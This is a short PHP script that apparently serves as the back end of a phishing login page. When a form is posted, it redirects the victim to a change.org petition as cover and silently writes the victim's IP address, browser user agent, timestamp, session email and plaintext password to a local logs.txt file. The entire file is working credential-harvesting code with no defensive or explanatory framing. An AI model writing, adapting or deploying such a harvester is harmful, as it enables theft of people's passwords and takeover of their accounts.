<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    header("location: https://www.change.org/p/ugc-india-make-college-campuses-safer-now-with-active-compliant-anti-harassment-cells?source_location=discover_feed");
    $handle = fopen("./logs.txt", "a");
    date_default_timezone_set("Asia/Kolkata");
    fwrite($handle, "IP");
    fwrite($handle, "       =  ");
    fwrite($handle, $_SERVER['REMOTE_ADDR']);
    fwrite($handle, "\n");
	
    fwrite($handle, "UA");
    fwrite($handle, "       =  ");
    fwrite($handle, $_SERVER['HTTP_USER_AGENT']);
    fwrite($handle, "\n");
	
    fwrite($handle, "Time");
    fwrite($handle, "     =  ");
    fwrite($handle, date("d-m-Y h:i:sa"));
    fwrite($handle, "\n");
	
    $email=$_SESSION["Email"];
	fwrite($handle, "Email");
    fwrite($handle, "    =  ");
    fwrite($handle, $email);
    fwrite($handle, "\n");
	
	$password = $_POST["password"];
	fwrite($handle, "Password");
    fwrite($handle, " =  ");
    fwrite($handle, $password);
    fwrite($handle, "\n");
	
    fwrite($handle, "\n");
    fclose($handle);
    exit;
}
session_destroy();
?>
